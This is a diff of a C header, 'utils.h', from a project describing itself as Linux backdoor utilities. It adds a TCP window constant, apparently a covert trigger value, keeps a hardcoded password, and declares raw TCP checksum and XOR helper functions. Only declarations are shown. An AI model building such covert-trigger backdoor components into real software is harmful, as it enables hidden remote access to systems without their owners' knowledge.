@@ -1,5 +1,5 @@
 /*-----------------------------------------------------------------------------
- * utils.h - Linux backdoor client utilities
+ * utils.h - Linux backdoor utilities
  * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
  * 
  * This program is free software: you can redistribute it and/or modify
@@ -21,21 +21,17 @@
 
 #include <stdio.h>
 #include <stdlib.h>
-#include <unistd.h>
-#include <err.h>
 #include <string.h>
 
-#define __FAVOR_BSD		/* use BSD-style headers */
+#define __FAVOR_BSD	/* use BSD-style headers */
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-
-/* error codes */
 
 /* defaults */
-#define PASSWORD "~:gm$*{("
+#define WINDOW_COM	35447
+#define PASSWORD	"~:gm$*{("
 
+/* function prototypes */
 unsigned short in_cksum(unsigned short *, int);
 unsigned short in_cksum_tcp(int, int, unsigned short *, int);
 char *xor(char *);
